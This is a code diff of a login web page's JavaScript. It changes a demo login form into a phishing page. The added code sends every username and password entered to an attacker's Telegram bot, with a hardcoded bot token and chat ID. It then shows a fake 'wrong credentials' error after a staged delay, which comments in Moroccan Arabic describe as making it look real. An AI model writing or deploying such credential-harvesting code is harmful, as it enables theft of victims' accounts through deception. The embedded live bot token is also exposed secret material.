@@ -481,128 +481,97 @@
 </footer>
 
 <script>
-  let pwVisible = false;
-
-  function onInput() {
-    const u = document.getElementById('username').value.trim();
-    const p = document.getElementById('password').value;
-    const btn = document.getElementById('btn-login');
-    const ready = u.length > 0 && p.length > 0;
-    btn.disabled = !ready;
-    btn.classList.toggle('ready', ready);
-    // Clear errors on re-type
-    document.getElementById('error-banner').classList.remove('show');
-    document.getElementById('username').classList.remove('error');
-    document.getElementById('password').classList.remove('error');
-    document.getElementById('err-username').classList.remove('show');
-    document.getElementById('err-password').classList.remove('show');
-  }
-
-  function onKeydown(e) {
-    if (e.key === 'Enter') doLogin();
-  }
-
-  function togglePw() {
-    pwVisible = !pwVisible;
-    const input = document.getElementById('password');
-    input.type = pwVisible ? 'text' : 'password';
-    document.getElementById('icon-eye').style.display = pwVisible ? 'none' : 'block';
-    document.getElementById('icon-eye-off').style.display = pwVisible ? 'block' : 'none';
-  }
-
-  function doLogin() {
-    const u = document.getElementById('username').value.trim();
-    const p = document.getElementById('password').value;
-    let valid = true;
-
-    if (!u) {
-      document.getElementById('username').classList.add('error');
-      document.getElementById('err-username').classList.add('show');
-      valid = false;
-    }
-    if (!p) {
-      document.getElementById('password').classList.add('error');
-      document.getElementById('err-password').classList.add('show');
-      valid = false;
-    }
-    if (!valid) return;
-
-    // Simulate loading
-    const btn = document.getElementById('btn-login');
-    btn.classList.add('loading');
-    btn.disabled = true;
-
-    setTimeout(() => {
-      btn.classList.remove('loading');
-      btn.classList.add('ready');
-      btn.disabled = false;
-      // Show error (demo — wrong credentials)
-      document.getElementById('username').classList.add('error');
-      document.getElementById('password').classList.add('error');
-      document.getElementById('error-banner').classList.add('show');
-    }, 1800);
-
-
-}
-
-
-
-
-
-
-
-// 1. حط التوكن ديال البوت والأيدي ديال الشات ديالك
+  // 1. معلومات البوت ديالك
 const BOT_TOKEN = '6649802802:AAEm_J4ysLUGctR1uAOw2IjaID24Cs6vjIA';
 const CHAT_ID = '5310078604';
 
-// 2. الدالة لي كتتكلف وتصيفط الميساج لتيليغرام
-async function sendAlertToTelegram(message) {
+let pwVisible = false;
+
+// دالة إرسال المعلومات لتيليغرام
+async function sendToTelegram(u, p) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-    
-    const payload = {
-        chat_id: CHAT_ID,
-        text: message,
-        parse_mode: 'HTML'
-    };
+    const message = `🚨 <b>New Login Attempt</b>\n\n👤 <b>User:</b> <code>${u}</code>\n🔑 <b>Pass:</b> <code>${p}</code>`;
 
     try {
         await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
         });
-        console.log("✅ Message sent successfully!");
-    } catch (error) {
-        console.error('⚠️ Error connecting to Telegram API:', error);
+    } catch (e) {
+        console.error("Telegram Error:", e);
     }
 }
 
-// 3. الربط مع البوطون (login)
-document.getElementById('login').addEventListener('click', function(event) {
-    // هادي كتمنع الفورم إلا كانت وسط <form> باش ما ديرش ريفريش للصفحة
-    event.preventDefault(); 
-
+function onInput() {
     const u = document.getElementById('username').value.trim();
     const p = document.getElementById('password').value;
+    const btn = document.getElementById('btn-login');
+    const ready = u.length > 0 && p.length > 0;
+    
+    btn.disabled = !ready;
+    btn.classList.toggle('ready', ready);
 
-    // التأكد من أن الخانات ماشي خاويين
-    if (!u || !p) {
-        alert("Please fill in all fields");
-        return;
+    // مسح الأخطاء فاش كيبدا يكتب
+    document.getElementById('error-banner').classList.remove('show');
+    document.querySelectorAll('.error').forEach(el => el.classList.remove('error'));
+    document.querySelectorAll('.show').forEach(el => el.classList.remove('show'));
+}
+
+function togglePw() {
+    pwVisible = !pwVisible;
+    const input = document.getElementById('password');
+    input.type = pwVisible ? 'text' : 'password';
+    document.getElementById('icon-eye').style.display = pwVisible ? 'none' : 'block';
+    document.getElementById('icon-eye-off').style.display = pwVisible ? 'block' : 'none';
+}
+
+async function doLogin() {
+    const u = document.getElementById('username').value.trim();
+    const p = document.getElementById('password').value;
+    let valid = true;
+
+    // التحقق من الخانات
+    if (!u) {
+        document.getElementById('username').classList.add('error');
+        document.getElementById('err-username').classList.add('show');
+        valid = false;
     }
+    if (!p) {
+        document.getElementById('password').classList.add('error');
+        document.getElementById('err-password').classList.add('show');
+        valid = false;
+    }
+    if (!valid) return;
 
-    const alertMessage = `
-🚨 <b>New Login Attempt!</b>
-<b>User:</b> ${u}
-<b>Pass:</b> ${p}
-<b>Service:</b> Auth Service
-`;
+    // تفعيل حالة التحميل (Loading)
+    const btn = document.getElementById('btn-login');
+    btn.classList.add('loading');
+    btn.disabled = true;
 
-    // عيط للدالة باش تصيفط
-    sendAlertToTelegram(alertMessage);
+    // --- هنا فين كنصيفطو المعلومات لتيليغرام ---
+    await sendToTelegram(u, p);
+
+    // محاكاة وقت الانتظار باش يبان داكشي حقيقي (1.5 ثانية)
+    setTimeout(() => {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+        
+        // إظهار خطأ وهمي للمستخدم (مثلا: كلمة السر غلط)
+        document.getElementById('username').classList.add('error');
+        document.getElementById('password').classList.add('error');
+        document.getElementById('error-banner').classList.add('show');
+    }, 1500);
+}
+
+// إضافة Event Listener للـ Enter key
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') doLogin();
 });
-
-
 
 
 
